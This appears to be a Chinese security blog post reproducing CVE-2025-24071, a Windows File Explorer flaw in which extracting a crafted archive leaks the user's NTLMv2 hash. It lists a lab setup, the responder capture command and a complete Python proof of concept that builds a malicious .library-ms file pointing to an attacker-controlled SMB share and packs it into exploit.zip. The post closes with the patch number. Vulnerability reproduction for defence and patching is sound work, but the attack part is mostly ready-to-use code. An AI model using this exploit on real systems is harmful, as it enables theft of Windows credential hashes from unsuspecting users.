#  【漏洞复现】CVE-2025-24071｜Windows 文件资源管理器欺骗漏洞   
 sec0nd安全   2025-04-19 12:59  
  
            
  
0x00 前言  
  
  
Window  
s  
文件资源管理器（File Explorer）是Windows操作系统的核心组件，主要用于浏览、管理和操作本地及网络文件、文件夹、驱动器等资源。它提供直观的图形化界面，支持文件创建、复制、移动、删除、重命名等基础操作，同时集成网络共享访问、外部设备管理、文件搜索与筛选等高级功能，是多任务文件处理的核心工具‌。  
  
        
  
      
  
0x01 漏洞描述  
  
            
  
Windows资源管理器在解压包含特制 .library-ms文件的 RAR/ZIP 存档时，会自动解析该文件内嵌的恶意SMB路径（如 \\192.168.1.116\shared），触发隐式NTLM认证握手，导致用户NTLMv2哈希泄露。  
  
  
           
  
0x02 漏洞复现  
  
            
  
(1)准备工具  
```
Windows系统（被攻击）IP:192.168.2.11
Kali Linux（攻击）IP:192.168.2.12
CVE-2025-24071的POC文件a.py
Kali Linux中间人工具responder
```  
  
         
  
(2)复现过程   
  
1、设置windows的IP地址：192.168.2.11  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6up1gMsFGLBJ0iaIDSdg8LnCWblqac9AJGPcTevwwsqPSvOf9c51MfdVGugzp2rrfIiaxUsGdLHm9lpg/640?wx_fmt=png "")  
  
               
  
2、设置kali的IP地址：192.168.2.12  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6up1gMsFGLBJ0iaIDSdg8LnCWuH1dBJEbv6JGWpI4IcU0reficzenhS2eLHj99suWWCq8m7aUAMS66hg/640?wx_fmt=png "")  
  
            
  
3、在kali中打开responder中间人工具，终端执行命令：  
```
sudo responder -I eth0 -v
```  
  
                  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6up1gMsFGLBJ0iaIDSdg8LnCWUYXnUYiciaibSsmGlkHHZIYALzRXiaxt1uxQuWoVdquGwXIJ59Yuia5IGbQ/640?wx_fmt=png "")  
  
            
  
4、生成恶意压缩包，终端执行命令python a.py   
  
            
  
a.py内容如下：           
```
import os
import zipfile
def main():
    file_name = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")
    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
    library_file_name = f"{file_name}.library-ms"
    with open(library_file_name, "w", encoding="utf-8") as f:
        f.write(library_content)
    with zipfile.ZipFile("exploit.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(library_file_name)
    if os.path.exists(library_file_name):
        os.remove(library_file_name)
    print("completed")
if __name__ == "__main__":
    main()

```  
  
                    
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6up1gMsFGLBJ0iaIDSdg8LnCWRxL2F8XYTFxicAHh9BGIoy90iaIFjHx4v5NiaD4ic45BV6ppg6OgibmpMOg/640?wx_fmt=png "")  
  
                   
  
5、把生成的exploit.zip压缩包放到windows系统中解压。  
  
                   
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6up1gMsFGLBJ0iaIDSdg8LnCW1sO7CR4VlaOhyPIFaQxq6xtXTJNpnvGFev27vgspg3Ty1uYt0VCRmQ/640?wx_fmt=png "")  
  
                    
  
6、kali系统中成功获取到windows的hash  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6up1gMsFGLBJ0iaIDSdg8LnCW18whNLHbQ1PIt20FDCjTibk3o52fOAiazricg2uEeD3pyCibO73GwXN6zA/640?wx_fmt=png "")  
  
      
  
        
  
0x03 漏洞补丁  
  
  
编号：KB5053606  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6up1gMsFGLBJ0iaIDSdg8LnCW4fAOl3r77iaC97zNqumeaib2Bnc7h80BRibe9yybU5eMXuTmsCdDk2gnQ/640?wx_fmt=png "")  
  
           
  
  
0x04 参考链接  
  
            
  
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071  
  
            
  
            
  
            
  
推荐阅读：  
        
  
  
【漏洞复现】LimeSurvey XSS漏洞  
  
  
[【漏洞复现】CVE-2023-2640 Ubuntu本地权限提升](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247484627&idx=1&sn=251a78ec1ad98d3e3b4400525a7b08bf&scene=21#wechat_redirect)  
  
  
  
[【漏洞复现】CVE-2023-38831 WinRAR代码执行漏洞](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247484513&idx=1&sn=0fc004e592088c252a8a6ebfc33c3ea0&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
